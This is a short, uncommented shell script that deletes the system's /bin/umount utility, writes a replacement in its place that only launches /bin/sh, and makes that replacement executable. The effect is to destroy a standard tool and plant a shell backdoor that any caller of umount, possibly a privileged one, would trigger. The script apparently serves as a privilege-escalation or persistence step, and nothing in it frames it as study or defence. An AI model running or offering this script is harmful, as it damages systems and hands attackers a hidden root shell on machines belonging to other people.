#!/bin/sh
rm /bin/umount
echo "#!/bin/sh" > /bin/umount
echo "/bin/sh" >> /bin/umount
chmod +x /bin/umount
exit

